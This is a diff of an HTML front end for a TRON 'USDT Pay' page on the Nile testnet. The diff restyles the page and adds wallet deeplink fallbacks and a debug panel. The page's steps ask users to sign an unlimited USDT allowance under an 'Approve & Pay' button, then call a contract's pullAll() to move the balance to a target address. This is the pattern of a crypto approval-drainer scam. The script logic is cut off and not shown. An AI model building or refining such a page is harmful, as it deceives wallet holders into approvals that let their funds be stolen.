@@ -1,249 +1,164 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>USDT Pay - TRON Nile</title>
-  <style>
-    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-    :root {
-      --bg:      #090910;
-      --surface: #0f0f1a;
-      --surface2:#151525;
-      --border:  #1e1e32;
-      --border2: #282845;
-      --accent:  #5b6af0;
-      --accent2: #8b5cf6;
-      --ok:      #22c55e;
-      --err:     #ef4444;
-      --warn:    #f59e0b;
-      --txt:     #e2e2f0;
-      --mute:    #555575;
-      --mute2:   #8888aa;
-      --code:    #a5b4fc;
-      --card-bg: #111120;
-    }
-    html, body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      background: var(--bg);
-      color: var(--txt);
-      min-height: 100vh;
-      -webkit-font-smoothing: antialiased;
-    }
-    .wrap {
-      max-width: 420px;
-      margin: 0 auto;
-      padding: 16px 16px 60px;
-    }
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+<title>USDT Pay - TRON Nile</title>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#090910;--surface:#0f0f1a;--surface2:#151525;--border:#1e1e32;--border2:#282845;
+  --accent:#5b6af0;--accent2:#8b5cf6;--ok:#22c55e;--err:#ef4444;--warn:#f59e0b;
+  --txt:#e2e2f0;--mute:#555575;--mute2:#8888aa;--code:#a5b4fc;--card-bg:#111120;
+}
+html,body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;-webkit-font-smoothing:antialiased}
+.wrap{max-width:420px;margin:0 auto;padding:16px 16px 80px}
 
-    /* ---- top bar ---- */
-    .topbar {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      margin-bottom: 20px;
-    }
-    .topbar-title {
-      font-size: 18px;
-      font-weight: 700;
-      background: linear-gradient(90deg, var(--accent), var(--accent2));
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .topbar-sub { font-size: 11px; color: var(--mute); margin-top: 2px; }
-    .badge-row { display: flex; gap: 6px; flex-wrap: wrap; }
-    .badge {
-      display: inline-flex; align-items: center; gap: 4px;
-      padding: 3px 9px; border-radius: 20px;
-      font-size: 10px; font-weight: 600;
-      border: 1px solid var(--border); color: var(--mute);
-      background: transparent;
-    }
-    .badge::before {
-      content: ''; width: 5px; height: 5px;
-      border-radius: 50%; background: currentColor;
-    }
-    .badge.nile   { color: var(--ok);      border-color: #1a3a1a; }
-    .badge.mainnet{ color: var(--warn);    border-color: #3a2e0a; }
-    .badge.testnet{ color: var(--accent);  border-color: #1a1a40; }
-    .badge.ok     { color: var(--ok);      border-color: #1a3a1a; }
-    .badge.no     { color: var(--err);     border-color: #3a1a1a; }
-    .badge.mobile { color: var(--code);    border-color: #2a2a4a; }
+/* topbar */
+.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px}
+.topbar-title{font-size:18px;font-weight:700;background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.topbar-sub{font-size:11px;color:var(--mute);margin-top:2px}
+.badge-row{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
+.badge{display:inline-flex;align-items:center;gap:4px;padding:3px 9px;border-radius:20px;font-size:10px;font-weight:600;border:1px solid var(--border);color:var(--mute);background:transparent}
+.badge::before{content:'';width:5px;height:5px;border-radius:50%;background:currentColor}
+.badge.nile{color:var(--ok);border-color:#1a3a1a}
+.badge.mainnet{color:var(--warn);border-color:#3a2e0a}
+.badge.testnet{color:var(--accent);border-color:#1a1a40}
+.badge.ok{color:var(--ok);border-color:#1a3a1a}
+.badge.no{color:var(--err);border-color:#3a1a1a}
+.badge.mobile{color:var(--code);border-color:#2a2a4a}
+.badge.im{color:#818cf8;border-color:#2a2a50}
+.badge.tp{color:#22c55e;border-color:#1a3a1a}
+.badge.warn{color:var(--warn);border-color:#3a2e0a}
 
-    /* ---- info card ---- */
-    .info-card {
-      background: var(--card-bg);
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 16px;
-      margin-bottom: 12px;
-    }
-    .info-row {
-      display: flex; justify-content: space-between; align-items: flex-start;
-      padding: 7px 0; border-bottom: 1px solid var(--border); gap: 12px;
-    }
-    .info-row:last-child { border-bottom: none; }
-    .info-lbl { font-size: 12px; color: var(--mute); flex-shrink: 0; }
-    .info-val {
-      font-size: 12px; color: var(--code);
-      font-family: 'Courier New', monospace;
-      text-align: right; word-break: break-all; line-height: 1.5;
-    }
-    .info-val.ok     { color: var(--ok); }
-    .info-val.warn   { color: var(--warn); }
-    .info-val.err    { color: var(--err); }
-    .info-val.copy   { cursor: pointer; }
-    .info-val.copy:hover { opacity: 0.7; }
+/* info card */
+.info-card{background:var(--card-bg);border:1px solid var(--border);border-radius:14px;padding:16px;margin-bottom:12px}
+.info-row{display:flex;justify-content:space-between;align-items:flex-start;padding:7px 0;border-bottom:1px solid var(--border);gap:12px}
+.info-row:last-child{border-bottom:none}
+.info-lbl{font-size:12px;color:var(--mute);flex-shrink:0}
+.info-val{font-size:12px;color:var(--code);font-family:'Courier New',monospace;text-align:right;word-break:break-all;line-height:1.5}
+.info-val.ok{color:var(--ok)}
+.info-val.warn{color:var(--warn)}
+.info-val.err{color:var(--err)}
+.info-val.copy{cursor:pointer}
+.info-val.copy:hover{opacity:0.7}
 
-    /* ---- steps ---- */
-    .step {
-      display: flex; align-items: flex-start; gap: 12px;
-      padding: 13px 14px; margin-bottom: 8px;
-      background: var(--surface); border: 1px solid var(--border);
-      border-radius: 12px; font-size: 13px;
-    }
-    .sn {
-      width: 24px; height: 24px; border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 11px; font-weight: 700; flex-shrink: 0;
-      background: var(--border2); border: 1px solid var(--border2);
-      color: var(--mute); transition: all 0.3s;
-    }
-    .sb { flex: 1; min-width: 0; }
-    .st { font-size: 13px; font-weight: 600; color: var(--mute2); }
-    .sm { font-size: 11px; color: var(--mute); margin-top: 3px; line-height: 1.5; }
+/* steps */
+.step{display:flex;align-items:flex-start;gap:12px;padding:13px 14px;margin-bottom:8px;background:var(--surface);border:1px solid var(--border);border-radius:12px;font-size:13px;transition:all 0.3s}
+.sn{width:24px;height:24px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;background:var(--border2);border:1px solid var(--border2);color:var(--mute);transition:all 0.3s}
+.sb{flex:1;min-width:0}
+.st{font-size:13px;font-weight:600;color:var(--mute2)}
+.sm{font-size:11px;color:var(--mute);margin-top:3px;line-height:1.5}
+.step.on{border-color:#2a2a5a;background:#0f0f22}
+.step.on .sn{background:#1a1a40;border-color:var(--accent);color:var(--accent)}
+.step.on .st{color:var(--accent)}
+.step.ok{border-color:#1a3a1a;background:#081008}
+.step.ok .sn{background:#1a3a1a;border-color:var(--ok);color:var(--ok)}
+.step.ok .st{color:var(--ok)}
+.step.fail{border-color:#3a1a1a;background:#100808}
+.step.fail .sn{background:#3a1a1a;border-color:var(--err);color:var(--err)}
+.step.fail .st{color:var(--err)}
+.txlink{font-size:11px;color:var(--accent);text-decoration:none;word-break:break-all;display:block;margin-top:3px;cursor:pointer}
+.txlink:hover{text-decoration:underline}
 
-    .step.on  { border-color: #2a2a5a; background: #0f0f22; }
-    .step.on  .sn { background: #1a1a40; border-color: var(--accent); color: var(--accent); }
-    .step.on  .st { color: var(--accent); }
-    .step.ok  { border-color: #1a3a1a; background: #081008; }
-    .step.ok  .sn { background: #1a3a1a; border-color: var(--ok); color: var(--ok); }
-    .step.ok  .st { color: var(--ok); }
-    .step.fail{ border-color: #3a1a1a; background: #100808; }
-    .step.fail .sn { background: #3a1a1a; border-color: var(--err); color: var(--err); }
-    .step.fail .st { color: var(--err); }
+/* env detection result */
+.env-card{background:#0d0d1e;border:1px solid var(--border);border-radius:10px;padding:12px 14px;margin-bottom:14px;font-size:12px;font-family:'Courier New',monospace;color:var(--mute2);line-height:2}
+.env-card .env-line{display:flex;justify-content:space-between;gap:12px}
+.env-card .env-key{color:var(--mute)}
+.env-card .env-val{color:var(--code);text-align:right;word-break:break-all}
+.env-card .env-val.true{color:var(--ok)}
+.env-card .env-val.false{color:var(--err)}
+.env-card .env-val.warn{color:var(--warn)}
 
-    .txlink {
-      font-size: 11px; color: var(--accent); text-decoration: none;
-      word-break: break-all; display: block; margin-top: 3px; cursor: pointer;
-    }
-    .txlink:hover { text-decoration: underline; }
+/* wallet buttons */
+.wg{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px}
+.wb{display:flex;flex-direction:column;align-items:center;justify-content:center;padding:22px 12px;background:var(--surface);border:1px solid var(--border2);border-radius:16px;cursor:pointer;transition:all 0.2s;user-select:none}
+.wb:hover:not(.dis){border-color:var(--accent);background:#12122a;transform:translateY(-1px)}
+.wb:active:not(.dis){transform:scale(0.97)}
+.wb.dis{opacity:0.38;cursor:not-allowed}
+.wi{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;margin-bottom:10px}
+.wb.im .wi{background:linear-gradient(135deg,#5b6af0,#8b5cf6)}
+.wb.tp .wi{background:linear-gradient(135deg,#22c55e,#10b981)}
+.wn{font-size:14px;font-weight:600;color:var(--txt)}
+.ws{font-size:10px;color:var(--mute);margin-top:2px}
+.wbtn-label{font-size:11px;color:var(--mute);margin-bottom:8px;text-align:center}
 
-    /* ---- wallet grid ---- */
-    .wg { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 12px; }
-    .wb {
-      display: flex; flex-direction: column; align-items: center;
-      justify-content: center; padding: 22px 12px;
-      background: var(--surface); border: 1px solid var(--border2);
-      border-radius: 16px; cursor: pointer; transition: all 0.2s;
-      user-select: none;
-    }
-    .wb:hover:not(.dis) { border-color: var(--accent); background: #12122a; transform: translateY(-1px); }
-    .wb:active:not(.dis){ transform: scale(0.97); }
-    .wb.dis { opacity: 0.38; cursor: not-allowed; }
-    .wi {
-      width: 44px; height: 44px; border-radius: 12px;
-      display: flex; align-items: center; justify-content: center; margin-bottom: 10px;
-    }
-    .wb.im .wi { background: linear-gradient(135deg, #5b6af0, #8b5cf6); }
-    .wb.tp .wi { background: linear-gradient(135deg, #22c55e, #10b981); }
-    .wn { font-size: 14px; font-weight: 600; color: var(--txt); }
-    .ws { font-size: 10px; color: var(--mute); margin-top: 2px; }
+/* action buttons */
+.abtn{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:14px;background:linear-gradient(135deg,var(--accent),var(--accent2));color:#fff;border:none;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer;transition:all 0.2s;margin-bottom:8px}
+.abtn:hover:not(:disabled){filter:brightness(1.12);transform:translateY(-1px)}
+.abtn:active:not(:disabled){transform:scale(0.99)}
+.abtn:disabled{opacity:0.45;cursor:not-allowed}
+.abtn.ok{background:linear-gradient(135deg,var(--ok),#15803d)}
+.abtn.sec{background:var(--surface);border:1px solid var(--border2);color:var(--txt)}
+.abtn.danger{background:linear-gradient(135deg,var(--err),#b91c1c)}
+.abtn.sub{display:block;font-size:11px;font-weight:400;color:var(--mute);text-align:center;margin-bottom:10px}
 
-    /* ---- action buttons ---- */
-    .abtn {
-      display: flex; align-items: center; justify-content: center; gap: 8px;
-      width: 100%; padding: 14px;
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      color: #fff; border: none; border-radius: 12px;
-      font-size: 14px; font-weight: 700; cursor: pointer; transition: all 0.2s;
-      margin-bottom: 8px;
-    }
-    .abtn:hover:not(:disabled) { filter: brightness(1.12); transform: translateY(-1px); }
-    .abtn:active:not(:disabled){ transform: scale(0.99); }
-    .abtn:disabled { opacity: 0.45; cursor: not-allowed; }
-    .abtn.ok  { background: linear-gradient(135deg, var(--ok), #15803d); }
-    .abtn.sec { background: var(--surface); border: 1px solid var(--border2); color: var(--txt); }
-    .abtn.sub {
-      display: block; font-size: 11px; font-weight: 400;
-      color: var(--mute); text-align: center; margin-bottom: 10px;
-    }
+/* alert boxes */
+.warn{display:flex;gap:10px;padding:12px 14px;background:#1a1400;border:1px solid #3a2e0a;border-radius:10px;margin-bottom:10px;font-size:12px;color:var(--warn);line-height:1.6}
+.err{display:flex;gap:10px;padding:12px 14px;background:#1a0808;border:1px solid #3a1a1a;border-radius:10px;margin-bottom:10px;font-size:12px;color:var(--err);line-height:1.6}
+.info-box{display:flex;gap:10px;padding:12px 14px;background:#0a0a1e;border:1px solid var(--border2);border-radius:10px;margin-bottom:10px;font-size:12px;color:var(--code);line-height:1.6}
+.ic{font-size:16px;flex-shrink:0;margin-top:1px}
 
-    /* ---- alert boxes ---- */
-    .warn {
-      display: flex; gap: 10px; padding: 12px 14px;
-      background: #1a1400; border: 1px solid #3a2e0a;
-      border-radius: 10px; margin-bottom: 10px;
-      font-size: 12px; color: var(--warn); line-height: 1.6;
-    }
-    .err {
-      display: flex; gap: 10px; padding: 12px 14px;
-      background: #1a0808; border: 1px solid #3a1a1a;
-      border-radius: 10px; margin-bottom: 10px;
-      font-size: 12px; color: var(--err); line-height: 1.6;
-    }
-    .ic { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+/* toast */
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(24px);background:#1a1a30;border:1px solid var(--border2);color:var(--txt);padding:10px 20px;border-radius:10px;font-size:13px;opacity:0;transition:all 0.3s;pointer-events:none;z-index:999;max-width:calc(100vw - 40px);text-align:center}
+.toast.sh{opacity:1;transform:translateX(-50%) translateY(0)}
+.toast.ok{border-color:#1a4a1a;color:var(--ok)}
+.toast.er{border-color:#4a1a1a;color:var(--err)}
+.toast.wn{border-color:#4a3a0a;color:var(--warn)}
 
-    /* ---- toast ---- */
-    .toast {
-      position: fixed; bottom: 30px; left: 50%;
-      transform: translateX(-50%) translateY(24px);
-      background: #1a1a30; border: 1px solid var(--border2);
-      color: var(--txt); padding: 10px 20px;
-      border-radius: 10px; font-size: 13px;
-      opacity: 0; transition: all 0.3s;
-      pointer-events: none; z-index: 999;
-      max-width: calc(100vw - 40px); text-align: center;
-    }
-    .toast.sh  { opacity: 1; transform: translateX(-50%) translateY(0); }
-    .toast.ok  { border-color: #1a4a1a; color: var(--ok); }
-    .toast.er  { border-color: #4a1a1a; color: var(--err); }
-    .toast.wn  { border-color: #4a3a0a; color: var(--warn); }
+/* modal */
+.ov{position:fixed;inset:0;background:rgba(0,0,0,0.75);display:flex;align-items:center;justify-content:center;z-index:1000;opacity:0;pointer-events:none;transition:opacity 0.25s;padding:20px}
+.ov.sh{opacity:1;pointer-events:all}
+.mo{background:#14142a;border:1px solid var(--border2);border-radius:18px;padding:28px 24px;width:100%;max-width:340px;text-align:center}
+.mt{font-size:17px;font-weight:700;color:var(--txt);margin-bottom:12px}
+.mb{font-size:13px;color:var(--mute2);line-height:1.7;margin-bottom:20px;text-align:left}
+.mh{display:block;padding:10px 14px;background:#0a0a1e;border:1px solid var(--border2);border-radius:8px;font-size:12px;font-family:'Courier New',monospace;color:var(--warn);margin-bottom:10px;word-break:break-all;text-align:left}
+.ma{display:flex;gap:10px}
+.ma button{flex:1;padding:11px;border-radius:10px;font-size:14px;font-weight:700;border:none;cursor:pointer;transition:all 0.2s}
+.btn-no{background:var(--border2);color:var(--txt)}
+.btn-yes{background:var(--accent);color:#fff}
+.btn-yes.dp{background:var(--err)}
+.btn-no:hover{background:var(--border)}
+.btn-yes:hover{filter:brightness(1.12)}
 
-    /* ---- modal ---- */
-    .ov {
-      position: fixed; inset: 0;
-      background: rgba(0,0,0,0.75);
-      display: flex; align-items: center; justify-content: center;
-      z-index: 1000; opacity: 0; pointer-events: none;
-      transition: opacity 0.25s; padding: 20px;
-    }
-    .ov.sh { opacity: 1; pointer-events: all; }
-    .mo {
-      background: #14142a; border: 1px solid var(--border2);
-      border-radius: 18px; padding: 28px 24px;
-      width: 100%; max-width: 340px; text-align: center;
-    }
-    .mt { font-size: 17px; font-weight: 700; color: var(--txt); margin-bottom: 12px; }
-    .mb { font-size: 13px; color: var(--mute2); line-height: 1.7; margin-bottom: 20px; text-align: left; }
-    .mh {
-      display: block; padding: 10px 14px;
-      background: #0a0a1e; border: 1px solid var(--border2);
-      border-radius: 8px; font-size: 12px;
-      font-family: 'Courier New', monospace;
-      color: var(--warn); margin-bottom: 10px;
-      word-break: break-all; text-align: left;
-    }
-    .ma { display: flex; gap: 10px; }
-    .ma button {
-      flex: 1; padding: 11px; border-radius: 10px;
-      font-size: 14px; font-weight: 700; border: none; cursor: pointer;
-      transition: all 0.2s;
-    }
-    .btn-no { background: var(--border2); color: var(--txt); }
-    .btn-yes { background: var(--accent); color: #fff; }
-    .btn-yes.dp { background: var(--err); }
-    .btn-no:hover  { background: var(--border); }
-    .btn-yes:hover { filter: brightness(1.12); }
+/* debug panel */
+.dbg-panel{background:#0a0a14;border:1px solid #1e2a3e;border-radius:12px;margin-bottom:14px;overflow:hidden}
+.dbg-header{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#0d1020;border-bottom:1px solid #1e2a3e;cursor:pointer;user-select:none}
+.dbg-header-left{display:flex;align-items:center;gap:8px;font-size:12px;font-weight:600;color:var(--code)}
+.dbg-toggle{font-size:14px;color:var(--mute);transition:transform 0.2s}
+.dbg-toggle.open{transform:rotate(90deg)}
+.dbg-body{max-height:0;overflow:hidden;transition:max-height 0.3s ease;font-size:11px;font-family:'Courier New',monospace;color:var(--mute2);line-height:1.8}
+.dbg-body.open{max-height:600px}
+.dbg-body pre{white-space:pre-wrap;word-break:break-all;padding:10px 14px;margin:0}
+.dbg-line{display:flex;gap:8px;padding:2px 14px;border-bottom:1px solid #0f0f1e}
+.dbg-line:last-child{border-bottom:none}
+.dbg-ts{color:var(--mute);flex-shrink:0}
+.dbg-tag{font-weight:700;flex-shrink:0;min-width:50px}
+.dbg-tag.info{color:var(--accent)}
+.dbg-tag.ok{color:var(--ok)}
+.dbg-tag.err{color:var(--err)}
+.dbg-tag.warn{color:var(--warn)}
+.dbg-tag.deep{color:#c084fc}
+.dbg-tag.tx{color:#34d399}
+.dbg-msg{flex:1;word-break:break-all}
 
-    /* ---- spinner / pulse ---- */
-    .sp { display: inline-block; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.2); border-top-color: currentColor; border-radius: 50%; animation: sp 0.7s linear infinite; vertical-align: middle; }
-    @keyframes sp { to { transform: rotate(360deg); } }
+/* divider */
+.dv{height:1px;background:var(--border);margin:16px 0}
 
-    /* ---- misc ---- */
-    .dv { height: 1px; background: var(--border); margin: 16px 0; }
-    .hd { display: none !important; }
-  </style>
+/* hidden */
+.hd{display:none!important}
+
+/* spinner */
+.spn{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,0.2);border-top-color:currentColor;border-radius:50%;animation:spn 0.7s linear infinite;vertical-align:middle}
+@keyframes spn{to{transform:rotate(360deg)}}
+
+/* fallback box */
+.fb{padding:16px;background:#1a0808;border:1px solid #3a1a1a;border-radius:12px;margin-bottom:12px}
+.fb-title{font-size:13px;font-weight:700;color:var(--err);margin-bottom:10px}
+.fb-btn{display:block;width:100%;padding:10px;background:#1a1a2e;border:1px solid var(--border2);border-radius:8px;color:var(--txt);font-size:13px;cursor:pointer;text-align:center;margin-top:6px;transition:all 0.2s}
+.fb-btn:hover{background:#252540}
+.fb-btn:active{transform:scale(0.98)}
+</style>
 </head>
 <body>
 
@@ -253,7 +168,7 @@
   <div class="topbar">
     <div>
       <div class="topbar-title">USDT Pay</div>
-      <div class="topbar-sub">TRON TRC20 - Nile Testnet</div>
+      <div class="topbar-sub" id="subTitle">TRON TRC20 - Nile Testnet</div>
     </div>
     <div class="badge-row" id="badgeRow">
       <span class="badge testnet" id="netBadge">Nile</span>
@@ -261,7 +176,7 @@
     </div>
   </div>
 
-  <!-- Step 1: Connect Wallet -->
+  <!-- Step 1 -->
   <div class="step" id="s1">
     <div class="sn" id="s1n">1</div>
     <div class="sb">
@@ -269,8 +184,7 @@
       <div class="sm" id="s1m">Select imToken or TokenPocket</div>
     </div>
   </div>
-
-  <!-- Step 2: Query Chain Data -->
+  <!-- Step 2 -->
   <div class="step" id="s2">
     <div class="sn" id="s2n">2</div>
     <div class="sb">
@@ -278,8 +192,7 @@
       <div class="sm" id="s2m">Query on-chain data after wallet connects</div>
     </div>
   </div>
-
-  <!-- Step 3: Approve (unlimited) -->
+  <!-- Step 3 -->
   <div class="step" id="s3">
     <div class="sn" id="s3n">3</div>
     <div class="sb">
@@ -287,8 +200,7 @@
       <div class="sm" id="s3m">Sign to grant contract unlimited USDT allowance</div>
     </div>
   </div>
-
-  <!-- Step 4: Wait for Approval Confirmation -->
+  <!-- Step 4 -->
   <div class="step" id="s4">
     <div class="sn" id="s4n">4</div>
     <div class="sb">
@@ -296,8 +208,7 @@
       <div class="sm" id="s4m">Waiting for approval tx to be confirmed...</div>
     </div>
   </div>
-
-  <!-- Step 5: Pull (transferFrom) -->
+  <!-- Step 5 -->
   <div class="step" id="s5">
     <div class="sn" id="s5n">5</div>
     <div class="sb">
@@ -305,8 +216,7 @@
       <div class="sm" id="s5m">Call contract pullAll to transfer USDT to target</div>
     </div>
   </div>
-
-  <!-- Step 6: Done -->
+  <!-- Step 6 -->
   <div class="step" id="s6">
     <div class="sn" id="s6n">6</div>
     <div class="sb">
@@ -315,21 +225,34 @@
     </div>
   </div>
 
-  <!-- Wallet buttons (shown before connection) -->
+  <!-- Wallet buttons area -->
   <div id="walletArea">
+    <!-- Fallback box (shown when deeplink fails) -->
+    <div class="fb hd" id="fallbackBox">
+      <div class="fb-title" id="fbTitle">Wallet not opened</div>
+      <div id="fbBody"></div>
+    </div>
+
+    <!-- Deeplink fallback countdown -->
+    <div class="info-box hd" id="dlCountdown">
+      <span class="ic">i</span>
+      <span>Opening wallet... If nothing happens, <span id="dlCountdownSec">5</span>s will show fallback options.</span>
+    </div>
+
+    <div class="wbtn-label" id="wbtnLabel">Tap a wallet to connect</div>
     <div class="wg">
-      <button class="wb im" id="btnIm" onclick="W.connect('imtoken')">
+      <button class="wb im" id="btnIm" onclick="App.connectWallet('imtoken')">
         <div class="wi">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
             <path d="M12 2L22 8V17L12 23L2 17V8L12 2Z" fill="white" fill-opacity="0.9"/>
-            <path d="M12 6L18 9V16L12 19L6 16V9L12 6Z" fill="url(#ig2)"/>
-            <defs><linearGradient id="ig2" x1="12" y1="6" x2="12" y2="19"><stop offset="0%" stop-color="#a5b4fc"/><stop offset="100%" stop-color="#6366f1"/></linearGradient></defs>
+            <path d="M12 6L18 9V16L12 19L6 16V9L12 6Z" fill="url(#ig3)"/>
+            <defs><linearGradient id="ig3" x1="12" y1="6" x2="12" y2="19"><stop offset="0%" stop-color="#a5b4fc"/><stop offset="100%" stop-color="#6366f1"/></linearGradient></defs>
           </svg>
         </div>
         <span class="wn">imToken</span>
         <span class="ws">TRON DApp</span>
       </button>
-      <button class="wb tp" id="btnTP" onclick="W.connect('tp')">
+      <button class="wb tp" id="btnTP" onclick="App.connectWallet('tp')">
         <div class="wi">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
             <circle cx="12" cy="12" r="11" fill="white" fill-opacity="0.9"/>
@@ -340,86 +263,50 @@
         <span class="ws">TRON DApp</span>
       </button>
     </div>
-    <div class="err" id="walletErrBox" style="display:none">
-      <span class="ic">!</span>
-      <span id="walletErrMsg"></span>
-    </div>
   </div>
 
-  <!-- Info panel (shown after connection) -->
+  <!-- Info panel (after connection) -->
   <div id="infoArea" class="hd">
 
     <div class="info-card">
-      <div class="info-row">
-        <span class="info-lbl">Wallet Address</span>
-        <span class="info-val copy" id="vAddr" onclick="copyTxt(this.textContent)" title="Click to copy"></span>
-      </div>
-      <div class="info-row">
-        <span class="info-lbl">USDT Contract</span>
-        <span class="info-val copy" id="vUsdt" onclick="copyTxt(this.textContent)" title="Click to copy"></span>
-      </div>
-      <div class="info-row">
-        <span class="info-lbl">Spender (Contract)</span>
-        <span class="info-val copy" id="vSpender" onclick="copyTxt(this.textContent)" title="Click to copy"></span>
-      </div>
-      <div class="info-row">
-        <span class="info-lbl">Target Address</span>
-        <span class="info-val copy" id="vTarget" onclick="copyTxt(this.textContent)" title="Click to copy"></span>
-      </div>
-      <div class="info-row">
-        <span class="info-lbl">Network</span>
-        <span class="info-val ok" id="vNet">Nile Testnet</span>
-      </div>
+      <div class="info-row"><span class="info-lbl">Wallet Address</span><span class="info-val copy" id="vAddr" onclick="copyTxt(this.textContent)"></span></div>
+      <div class="info-row"><span class="info-lbl">USDT Contract</span><span class="info-val copy" id="vUsdt" onclick="copyTxt(this.textContent)"></span></div>
+      <div class="info-row"><span class="info-lbl">Spender (Contract)</span><span class="info-val copy" id="vSpender" onclick="copyTxt(this.textContent)"></span></div>
+      <div class="info-row"><span class="info-lbl">Target Address</span><span class="info-val copy" id="vTarget" onclick="copyTxt(this.textContent)"></span></div>
+      <div class="info-row"><span class="info-lbl">Network</span><span class="info-val ok" id="vNet">Nile Testnet</span></div>
     </div>
 
     <div class="info-card">
-      <div class="info-row">
-        <span class="info-lbl">USDT Balance</span>
-        <span class="info-val" id="vBal">Querying...</span>
-      </div>
-      <div class="info-row">
-        <span class="info-lbl">Allowance</span>
-        <span class="info-val" id="vAllow">Querying...</span>
-      </div>
-      <div class="info-row">
-        <span class="info-lbl">Approve Type</span>
-        <span class="info-val warn">UNLIMITED</span>
-      </div>
+      <div class="info-row"><span class="info-lbl">USDT Balance</span><span class="info-val" id="vBal">Querying...</span></div>
+      <div class="info-row"><span class="info-lbl">Allowance</span><span class="info-val" id="vAllow">Querying...</span></div>
+      <div class="info-row"><span class="info-lbl">Approve Type</span><span class="info-val warn">UNLIMITED</span></div>
     </div>
 
     <div class="warn" id="balWarn" style="display:none">
       <span class="ic">!</span>
-      <span>USDT balance is 0. Please ensure your wallet has TRC20 USDT on Nile testnet to proceed.</span>
+      <span>USDT balance is 0. Please ensure your wallet has TRC20 USDT on Nile testnet.</span>
     </div>
-
     <div class="warn" id="allowWarn" style="display:none">
       <span class="ic">!</span>
-      <span id="allowWarnTxt">Allowance check info.</span>
+      <span id="allowWarnTxt"></span>
     </div>
 
     <div class="dv"></div>
 
-    <!-- Approve button (always present, works as "Approve = Pay") -->
     <div id="actApprove">
-      <div class="abtn sub">Step 3: Sign to grant UNLIMITED allowance to the contract</div>
-      <button class="abtn" id="btnApprove" onclick="W.doApprove()">
-        Approve &amp; Pay (Unlimited)
-      </button>
+      <div class="abtn sub" id="aprSub">Step 3: Sign to grant UNLIMITED allowance to the contract</div>
+      <button class="abtn" id="btnApprove" onclick="App.doApprove()">Approve &amp; Pay (Unlimited)</button>
     </div>
 
-    <!-- Pull button (shown after approval confirmed on-chain) -->
     <div id="actPull" class="hd">
       <div class="abtn sub">Step 5: Confirm to trigger contract pullAll()</div>
-      <button class="abtn ok" id="btnPull" onclick="W.doPull()">
-        Confirm Pull USDT
-      </button>
+      <button class="abtn ok" id="btnPull" onclick="App.doPull()">Confirm Pull USDT</button>
       <div class="warn" id="pullWarn">
         <span class="ic">!</span>
         <span id="pullWarnTxt"></span>
       </div>
     </div>
 
-    <!-- Error display -->
     <div class="err" id="errBox" style="display:none">
       <span class="ic">!</span>
       <span id="errTxt"></span>
@@ -427,24 +314,31 @@
 
     <div class="dv"></div>
 
-    <!-- Last tx hash -->
-    <div class="info-card" id="txCard" style="display:none">
-      <div class="info-row">
-        <span class="info-lbl">Last TX Hash</span>
-        <span class="info-val copy" id="vTxHash" onclick="copyTxt(this.textContent)"></span>
-      </div>
-      <div class="info-row">
-        <span class="info-lbl">Explorer</span>
-        <span class="info-val copy" id="vExplorer" onclick="copyTxt(this.textContent)" title="Click to copy"></span>
-      </div>
+    <div class="info-card hd" id="txCard">
+      <div class="info-row"><span class="info-lbl">Last TX Hash</span><span class="info-val copy" id="vTxHash" onclick="copyTxt(this.textContent)"></span></div>
+      <div class="info-row"><span class="info-lbl">Explorer</span><span class="info-val copy" id="vExplorer" onclick="copyTxt(this.textContent)" title="Click to copy"></span></div>
     </div>
 
-    <!-- Reset -->
-    <button class="abtn sec" id="btnReset" onclick="W.reset()">
-      Reset &amp; Start Over
-    </button>
+    <button class="abtn sec" onclick="App.reset()">Reset &amp; Start Over</button>
   </div>
 
+</div>
+
+<!-- Debug Panel -->
+<div class="wrap" style="padding-top:0">
+  <div class="dbg-panel">
+    <div class="dbg-header" onclick="App.toggleDebug()">
+      <div class="dbg-header-left">
+        <span>[DEBUG PANEL]</span>
+        <span style="font-size:11px;color:var(--mute);font-weight:400">Wallet Environment &amp; Logs</span>
+      </div>
+      <span class="dbg-toggle" id="dbgToggle">&#9654;</span>
+    </div>
+    <div class="dbg-body" id="dbgBody">
+      <div id="dbgEnv"></div>
+      <div id="dbgLog"></div>
+    </div>
+  </div>
 </div>
 
 <!-- Modal -->
@@ -453,8 +347,8 @@
     <div class="mt" id="mTitle"></div>
     <div class="mb" id="mBody"></div>
     <div class="ma">
-      <button class="btn-no" onclick="W.closeModal()">Cancel</button>
-      <button class="btn-yes" id="mBtn" onclick="W.onModalConfirm()">Confirm</button>
+      <button class="btn-no" onclick="App.closeModal()">Cancel</button>
+      <button class="btn-yes" id="mBtn" onclick="App.onModalConfirm()">Confirm</button>
     </div>
   </div>
 </div>
@@ -464,49 +358,16 @@
 
 <script>
 /* ================================================================
